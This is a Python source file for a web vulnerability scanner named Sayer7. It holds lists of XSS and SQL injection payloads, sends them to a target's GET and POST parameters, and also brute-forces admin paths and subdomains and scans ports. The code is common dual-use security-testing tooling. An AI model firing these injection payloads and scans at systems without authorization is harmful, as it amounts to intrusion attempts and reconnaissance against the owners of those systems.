#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Vulnerability Scanner for Sayer7
Comprehensive vulnerability assessment including XSS, SQLi, clickjacking, 
port scanning, admin panel discovery, and whois lookups
"""

import requests
import socket
import json
import time
import re
import urllib.parse
import subprocess
import threading
from typing import List, Dict, Optional, Tuple
from bs4 import BeautifulSoup
import dns.resolver
import whois
import concurrent.futures

class VulnerabilityScanner:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Sayer7 Vulnerability Scanner/1.0'
        })
        
        # Vulnerability payloads
        self.xss_payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '"><script>alert("XSS")</script>',
            "'><script>alert('XSS')</script>",
            'javascript:alert("XSS")',
            '<svg onload=alert("XSS")>',
            '<iframe src=javascript:alert("XSS")>',
            '<body onload=alert("XSS")>',
            '<input onfocus=alert("XSS") autofocus>',
            '<select onfocus=alert("XSS") autofocus>',
            '<textarea onfocus=alert("XSS") autofocus>',
            '<keygen onfocus=alert("XSS") autofocus>',
            '<video><source onerror="alert(1)">',
            '<audio src=x onerror=alert("XSS")>',
            '<marquee onstart=alert("XSS")>XSS</marquee>',
            '<details open ontoggle=alert("XSS")>',
            '<form onsubmit=alert("XSS")><input type=submit>',
            '<img src="data:image/svg+xml,<svg onload=alert(1)">',
            '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
            '<math href="javascript:alert(1)">XSS</math>'
        ]
        
        self.sqli_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            "admin'--",
            "admin' #",
            "admin'/*",
            "' or 1=1 or ''='",
            "' or 1=1--",
            "' or 1=1#",
            "' or 1=1/*",
            "') or '1'='1--",
            "') or ('1'='1--",
            "1' OR '1'='1",
            "1' OR 1 -- -",
            "1' OR 1=1--",
            "1' UNION SELECT NULL--",
            "1' UNION SELECT NULL,NULL--",
            "1' UNION SELECT NULL,NULL,NULL--",
            "1' AND 1=CONVERT(int,@@version)--",
            "1' AND 1=CONVERT(int,db_name())--",
            "1' AND 1=CONVERT(int,user)--"
        ]
        
        # Common admin panels
        self.admin_panels = [
            'admin', 'administrator', 'adminpanel', 'admincp', 'admin_area',
            'adminlogin', 'administratorlogin', 'admin_login', 'panel',
            'control', 'control_panel', 'cpanel', 'wp-admin', 'wp-login',
            'login', 'signin', 'dashboard', 'manage', 'manager', 'moderator',
            'modcp', 'staff', 'user', 'users', 'account', 'accounts',
            'phpmyadmin', 'pma', 'myadmin', 'database', 'dbadmin',
            'webadmin', 'webmaster', 'siteadmin', 'administration',
            'backend', 'backoffice', 'portal', 'console', 'system',
            'configuration', 'settings', 'setup', 'install', 'setup.php',
            'install.php', 'admin.php', 'administrator.php', 'panel.php',
            'login.php', 'index.php/admin', 'admin/index.php'
        ]
        
        # Common ports for scanning
        self.common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443,
                           993, 995, 1723, 3306, 3389, 5432, 5900, 8080, 8443, 9000]
    
    def scan_xss(self, url: str, parameters: List[str] = None) -> List[Dict]:
        """Scan for XSS vulnerabilities"""
        results = []
        
        try:
            parsed_url = urllib.parse.urlparse(url)
            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
            
            # Get parameters from URL if not provided
            if not parameters:
                params = urllib.parse.parse_qs(parsed_url.query)
                parameters = list(params.keys())
            
            # Test each parameter
            for param in parameters:
                for payload in self.xss_payloads:
                    try:
                        # Test GET parameters
                        test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                        response = self.session.get(test_url, timeout=10)
                        
                        # Check if payload is reflected
                        if payload in response.text:
                            results.append({
                                'vulnerability': 'XSS',
                                'parameter': param,
                                'payload': payload,
                                'url': test_url,
                                'severity': 'High',
                                'confidence': 'High',
                                'description': f'XSS vulnerability found in parameter {param}'
                            })
                        
                        # Test POST parameters
                        post_data = {param: payload}
                        response = self.session.post(url, data=post_data, timeout=10)
                        
                        if payload in response.text:
                            results.append({
                                'vulnerability': 'XSS',
                                'parameter': param,
                                'payload': payload,
                                'method': 'POST',
                                'severity': 'High',
                                'confidence': 'High',
                                'description': f'XSS vulnerability found in POST parameter {param}'
                            })
                        
                        time.sleep(0.5)  # Rate limiting
                        
                    except Exception as e:
                        continue
            
            # Test for reflected XSS in path
            for payload in self.xss_payloads[:5]:  # Test top 5 payloads
                try:
                    test_url = f"{url}/{urllib.parse.quote(payload)}"
                    response = self.session.get(test_url, timeout=10)
                    
                    if payload in response.text:
                        results.append({
                            'vulnerability': 'XSS',
                            'type': 'Reflected',
                            'payload': payload,
                            'url': test_url,
                            'severity': 'High',
                            'confidence': 'Medium',
                            'description': 'Reflected XSS vulnerability found in URL path'
                        })
                        
                except:
                    continue
        
        except Exception as e:
            print(f"Error in XSS scan: {str(e)}")
        
        return results
    
    def scan_sqli(self, url: str, parameters: List[str] = None) -> List[Dict]:
        """Scan for SQL injection vulnerabilities"""
        results = []
        
        try:
            parsed_url = urllib.parse.urlparse(url)
            
            # Get parameters from URL if not provided
            if not parameters:
                params = urllib.parse.parse_qs(parsed_url.query)
                parameters = list(params.keys())
            
            # SQL error indicators
            sql_errors = [
                'mysql_fetch_array', 'mysql_num_rows', 'mysql_error',
                'pg_query', 'pg_fetch_array', 'pg_num_rows',
                'ORA-', 'Oracle error', 'Oracle driver',
                'SQLite3::query', 'sqlite3.error',
                'Microsoft OLE DB Provider', 'ODBC SQL Server Driver',
                'SQLServer JDBC Driver', 'SqlException',
                'PostgreSQL query failed', 'Warning: pg_',
                'valid MySQL result', 'MySQL client ran out of memory',
                'error in your SQL syntax', 'mysql_errno',
                'supplied argument is not a valid MySQL result',
                'PostgreSQL query failed: ERROR',
                'Microsoft OLE DB Provider for ODBC Drivers error',
                'OLE DB Provider for SQL Server',
                'Unclosed quotation mark', 'SQLServer JDBC Driver'
            ]
            
            # Test each parameter
            for param in parameters:
                for payload in self.sqli_payloads:
                    try:
                        # Test GET parameters
                        test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                        response = self.session.get(test_url, timeout=10)
                        
                        # Check for SQL errors
                        for error in sql_errors:
                            if error.lower() in response.text.lower():
                                results.append({
                                    'vulnerability': 'SQL Injection',
                                    'parameter': param,
                                    'payload': payload,
                                    'url': test_url,
                                    'severity': 'High',
                                    'confidence': 'High',
                                    'description': f'SQL injection vulnerability detected in parameter {param}',
                                    'evidence': error
                                })
                                break
                        
                        # Test POST parameters
                        post_data = {param: payload}
                        response = self.session.post(url, data=post_data, timeout=10)
                        
                        for error in sql_errors:
                            if error.lower() in response.text.lower():
                                results.append({
                                    'vulnerability': 'SQL Injection',
                                    'parameter': param,
                                    'payload': payload,
                                    'method': 'POST',
                                    'url': url,
                                    'severity': 'High',
                                    'confidence': 'High',
                                    'description': f'SQL injection vulnerability detected in POST parameter {param}',
                                    'evidence': error
                                })
                                break
                        
                        time.sleep(0.5)
                        
                    except Exception as e:
                        continue
        
        except Exception as e:
            print(f"Error in SQLi scan: {str(e)}")
        
        return results
    
    def scan_clickjacking(self, url: str) -> List[Dict]:
        """Scan for clickjacking vulnerabilities"""
        results = []
        
        try:
            response = self.session.get(url, timeout=10)
            headers = response.headers
            
            # Check for X-Frame-Options header
            x_frame_options = headers.get('X-Frame-Options', '').lower()
            csp_header = headers.get('Content-Security-Policy', '').lower()
            
            if not x_frame_options and 'frame-ancestors' not in csp_header:
                results.append({
                    'vulnerability': 'Clickjacking',
                    'severity': 'Medium',
                    'confidence': 'High',
                    'description': 'Missing X-Frame-Options and CSP frame-ancestors headers',
                    'recommendation': 'Add X-Frame-Options: DENY or SAMEORIGIN header',
                    'evidence': {
                        'x_frame_options': x_frame_options,
                        'csp_header': csp_header
                    }
                })
            elif x_frame_options not in ['deny', 'sameorigin']:
                results.append({
                    'vulnerability': 'Clickjacking',
                    'severity': 'Low',
                    'confidence': 'Medium',
                    'description': 'Weak X-Frame-Options configuration',
                    'evidence': {'x_frame_options': x_frame_options}
                })
        
        except Exception as e:
            print(f"Error in clickjacking scan: {str(e)}")
        
        return results
    
    def scan_admin_panels(self, url: str) -> List[Dict]:
        """Scan for admin panels"""
        results = []
        
        try:
            parsed_url = urllib.parse.urlparse(url)
            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
            
            # Test common admin paths
            for panel in self.admin_panels:
                try:
                    test_urls = [
                        f"{base_url}/{panel}",
                        f"{base_url}/{panel}/",
                        f"{base_url}/{panel}.php",
                        f"{base_url}/{panel}.html",
                        f"{base_url}/{panel}.asp",
                        f"{base_url}/{panel}.jsp"
                    ]
                    
                    for test_url in test_urls:
                        response = self.session.get(test_url, timeout=5)
                        
                        # Check for admin indicators
                        admin_indicators = [
                            'admin', 'login', 'password', 'username', 'dashboard',
                            'control panel', 'administrator', 'authentication'
                        ]
                        
                        content_lower = response.text.lower()
                        
                        if response.status_code == 200 and any(
                            indicator in content_lower for indicator in admin_indicators
                        ):
                            results.append({
                                'vulnerability': 'Admin Panel Discovered',
                                'url': test_url,
                                'status_code': response.status_code,
                                'severity': 'Info',
                                'confidence': 'Medium',
                                'description': f'Potential admin panel found at {test_url}'
                            })
                        elif response.status_code == 401:
                            results.append({
                                'vulnerability': 'Authentication Required',
                                'url': test_url,
                                'status_code': response.status_code,
                                'severity': 'Info',
                                'confidence': 'High',
                                'description': f'Authentication required at {test_url}'
                            })
                        
                        time.sleep(0.1)
                        
                except Exception as e:
                    continue
        
        except Exception as e:
            print(f"Error in admin panel scan: {str(e)}")
        
        return results
    
    def scan_ports(self, host: str, ports: List[int] = None) -> List[Dict]:
        """Scan for open ports"""
        if not ports:
            ports = self.common_ports
        
        results = []
        
        def check_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((host, port))
                sock.close()
                
                if result == 0:
                    service = self.get_service_name(port)
                    return {
                        'port': port,
                        'status': 'open',
                        'service': service,
                        'severity': 'Info',
                        'description': f'Port {port} ({service}) is open'
                    }
                return None
            except:
                return None
        
        # Use thread pool for faster scanning
        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
            future_to_port = {executor.submit(check_port, port): port for port in ports}
            
            for future in concurrent.futures.as_completed(future_to_port):
                result = future.result()
                if result:
                    results.append(result)
        
        return results
    
    def get_service_name(self, port: int) -> str:
        """Get service name for port"""
        services = {
            21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS',
            80: 'HTTP', 110: 'POP3', 135: 'RPC', 139: 'NetBIOS', 143: 'IMAP',
            443: 'HTTPS', 993: 'IMAPS', 995: 'POP3S', 1723: 'PPTP',
            3306: 'MySQL', 3389: 'RDP', 5432: 'PostgreSQL', 5900: 'VNC',
            8080: 'HTTP-Alt', 8443: 'HTTPS-Alt', 9000: 'PHP-FPM'
        }
        return services.get(port, 'Unknown')
    
    def whois_lookup(self, domain: str) -> Dict:
        """Perform WHOIS lookup"""
        try:
            domain_info = whois.whois(domain)
            
            return {
                'domain': domain,
                'registrar': str(domain_info.registrar) if domain_info.registrar else None,
                'creation_date': str(domain_info.creation_date) if domain_info.creation_date else None,
                'expiration_date': str(domain_info.expiration_date) if domain_info.expiration_date else None,
                'name_servers': domain_info.name_servers if domain_info.name_servers else [],
                'status': domain_info.status if domain_info.status else [],
                'emails': domain_info.emails if domain_info.emails else [],
                'organization': str(domain_info.org) if domain_info.org else None,
                'country': str(domain_info.country) if domain_info.country else None
            }
            
        except Exception as e:
            return {
                'domain': domain,
                'error': str(e)
            }
    
    def dns_enumeration(self, domain: str) -> List[Dict]:
        """Enumerate DNS records"""
        results = []
        
        try:
            # A records
            try:
                answers = dns.resolver.resolve(domain, 'A')
                for answer in answers:
                    results.append({
                        'type': 'A',
                        'domain': domain,
                        'value': str(answer),
                        'description': 'IPv4 address'
                    })
            except:
                pass
            
            # AAAA records
            try:
                answers = dns.resolver.resolve(domain, 'AAAA')
                for answer in answers:
                    results.append({
                        'type': 'AAAA',
                        'domain': domain,
                        'value': str(answer),
                        'description': 'IPv6 address'
                    })
            except:
                pass
            
            # MX records
            try:
                answers = dns.resolver.resolve(domain, 'MX')
                for answer in answers:
                    results.append({
                        'type': 'MX',
                        'domain': domain,
                        'value': str(answer.exchange),
                        'priority': answer.preference,
                        'description': 'Mail exchange'
                    })
            except:
                pass
            
            # NS records
            try:
                answers = dns.resolver.resolve(domain, 'NS')
                for answer in answers:
                    results.append({
                        'type': 'NS',
                        'domain': domain,
                        'value': str(answer),
                        'description': 'Name server'
                    })
            except:
                pass
            
            # TXT records
            try:
                answers = dns.resolver.resolve(domain, 'TXT')
                for answer in answers:
                    results.append({
                        'type': 'TXT',
                        'domain': domain,
                        'value': str(answer),
                        'description': 'Text record'
                    })
            except:
                pass
            
            # CNAME records
            try:
                answers = dns.resolver.resolve(domain, 'CNAME')
                for answer in answers:
                    results.append({
                        'type': 'CNAME',
                        'domain': domain,
                        'value': str(answer),
                        'description': 'Canonical name'
                    })
            except:
                pass
            
        except Exception as e:
            results.append({
                'type': 'ERROR',
                'domain': domain,
                'error': str(e)
            })
        
        return results
    
    def subdomain_bruteforce(self, domain: str, wordlist: List[str] = None) -> List[Dict]:
        """Brute force subdomains"""
        if not wordlist:
            wordlist = [
                'www', 'mail', 'ftp', 'blog', 'dev', 'test', 'staging', 'api',
                'admin', 'panel', 'cpanel', 'webmail', 'secure', 'vpn', 'shop',
                'store', 'app', 'mobile', 'm', 'support', 'help', 'docs',
                'forum', 'chat', 'news', 'media', 'cdn', 'static', 'assets',
                'img', 'images', 'video', 'videos', 'download', 'downloads',
                'portal', 'login', 'auth', 'account', 'accounts', 'user',
                'users', 'client', 'clients', 'customer', 'customers',
                'portal', 'dashboard', 'console', 'manage', 'management',
                'internal', 'intranet', 'private', 'secure', 'ssl', 'https',
                'beta', 'alpha', 'demo', 'preview', 'new', 'old', 'legacy'
            ]
        
        results = []
        
        def check_subdomain(subdomain):
            try:
                full_domain = f"{subdomain}.{domain}"
                answers = dns.resolver.resolve(full_domain, 'A')
                
                return {
                    'subdomain': full_domain,
                    'ip': str(answers[0]),
                    'status': 'found',
                    'description': f'Subdomain {full_domain} resolves to {str(answers[0])}'
                }
            except:
                return None
        
        # Use thread pool for faster scanning
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            future_to_subdomain = {executor.submit(check_subdomain, sub): sub for sub in wordlist}
            
            for future in concurrent.futures.as_completed(future_to_subdomain):
                result = future.result()
                if result:
                    results.append(result)
        
        return results
    
    def run_full_scan(self, url: str) -> Dict:
        """Run full vulnerability scan"""
        print(f"Starting full vulnerability scan for {url}")
        
        results = {
            'url': url,
            'scan_time': time.strftime('%Y-%m-%d %H:%M:%S'),
            'vulnerabilities': [],
            'info': []
        }
        
        # Extract domain for DNS and WHOIS
        parsed_url = urllib.parse.urlparse(url)
        domain = parsed_url.netloc
        
        # Run individual scans
        print("Scanning for XSS vulnerabilities...")
        xss_results = self.scan_xss(url)
        results['vulnerabilities'].extend(xss_results)
        
        print("Scanning for SQL injection...")
        sqli_results = self.scan_sqli(url)
        results['vulnerabilities'].extend(sqli_results)
        
        print("Scanning for clickjacking...")
        clickjacking_results = self.scan_clickjacking(url)
        results['vulnerabilities'].extend(clickjacking_results)
        
        print("Scanning for admin panels...")
        admin_results = self.scan_admin_panels(url)
        results['info'].extend(admin_results)
        
        print("Scanning ports...")
        port_results = self.scan_ports(domain)
        results['info'].extend(port_results)
        
        print("Performing DNS enumeration...")
        dns_results = self.dns_enumeration(domain)
        results['info'].extend(dns_results)
        
        print("Performing WHOIS lookup...")
        whois_result = self.whois_lookup(domain)
        results['whois'] = whois_result
        
        print("Scanning subdomains...")
        subdomain_results = self.subdomain_bruteforce(domain)
        results['info'].extend(subdomain_results)
        
        return results